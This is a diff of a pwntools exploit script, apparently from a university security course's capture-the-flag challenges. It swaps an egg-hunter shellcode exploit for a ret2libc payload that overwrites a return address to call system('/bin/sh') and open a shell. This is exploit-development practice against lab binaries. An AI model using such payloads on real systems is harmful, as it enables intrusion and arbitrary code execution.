@@ -6,11 +6,11 @@ from pwn import *
 
 # Set up pwntools for the correct architecture
 context.update(arch='i386')
-exe = './find-me' #Change this
+exe = './swrop' #Change this
 
 PROGNAME = exe
 REMOTE = "comp6447.wtf" #Change this
-REMOTEPORT = 24973 #Change this
+REMOTEPORT = 26332 #Change this
 global p
 global e
 global global_timeout
@@ -47,54 +47,16 @@ else:
 #===========================================================
 #                    EXPLOIT GOES HERE
 #===========================================================
-# The first four instructions are equivalent to 0x4f904790.
-# This is our egg.
 
-# Egg hunter
-small_assembly = """
-_start:
-mov edx, 0x4f904790
-loop:
-inc eax
-cmp dword ptr [eax], edx
-jne loop
-jmp eax
-"""
-
-# Egg + Shellcode
-large_assembly = """
-nop
-inc edi
-nop
-dec edi
-
-xor ecx, ecx
-mul ecx
-
-sub esp, 400
-mov ecx, esp
-mov ebx, 1000
-mov eax, 0x3
-mov edx, 0xFF
-int 0x80
-
-mov eax, 0x4
-mov ebx, 0x1
-int 0x80
-
-mov eax, 0x1
-int 0x80
-"""
-
-
-
-small_asm = asm(small_assembly)
-large_asm = asm(large_assembly)
-
-p.recvuntil(b'smallbuf shellcode', drop=True)
-p.sendline(small_asm)
-p.recvuntil(b'bigbuf shellcode:', drop=True)
-p.sendline(large_asm)
+system_target = e.symbols["system"]
+binsh_target = next(e.search(b"/bin/sh\00"))
+offset = cyclic_find(0x6261616a)
+payload = fit({
+    offset: system_target,
+    offset + 4: p32(0),
+    offset + 8: p32(binsh_target)
+})
+p.sendline(payload)
 
 p.interactive()
 
